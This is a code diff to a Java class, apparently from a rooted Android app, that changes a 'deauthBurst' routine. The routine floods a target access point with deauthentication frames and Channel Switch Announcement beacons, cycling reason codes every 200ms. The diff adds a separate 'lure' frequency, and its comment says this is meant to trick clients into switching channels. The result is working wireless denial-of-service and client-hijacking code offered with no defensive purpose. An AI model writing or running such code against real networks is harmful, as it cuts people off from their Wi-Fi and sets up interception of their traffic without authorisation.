@@ -42,10 +42,10 @@ public class MonitorManager {
     /**
      * Deauth burst: rapid beacon_flood calls for durationSeconds.
      * Call interval ~200ms = ~50 calls per 10s = 500 deauth + 500 CSA beacons.
-     * (was 600ms — too sparse, clients easily ignored it)
      * @param freqMhz target AP frequency in MHz (e.g. 2437, NOT channel number!)
+     * @param csaFreqMhz CSA lure frequency — different channel to trick client into switching
      */
-    public void deauthBurst(String apMac, int freqMhz, int durationSeconds) {
+    public void deauthBurst(String apMac, int freqMhz, int csaFreqMhz, int durationSeconds) {
         if (!monitorEnabled) return;
         long end = System.currentTimeMillis() + durationSeconds * 1000L;
         final int[] REASONS = {1, 2, 3, 4, 6, 7};
@@ -53,9 +53,9 @@ public class MonitorManager {
         while (System.currentTimeMillis() < end) {
             int reason = REASONS[ri % REASONS.length];
             execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
-                         + " \"x\" " + freqMhz + " " + freqMhz + " " + reason + " 2>/dev/null");
+                         + " \"x\" " + freqMhz + " " + csaFreqMhz + " " + reason + " 2>/dev/null");
             ri++;
-            try { Thread.sleep(200); } catch (Exception e) {}  // was 600ms — 3x denser
+            try { Thread.sleep(200); } catch (Exception e) {}
         }
     }
     
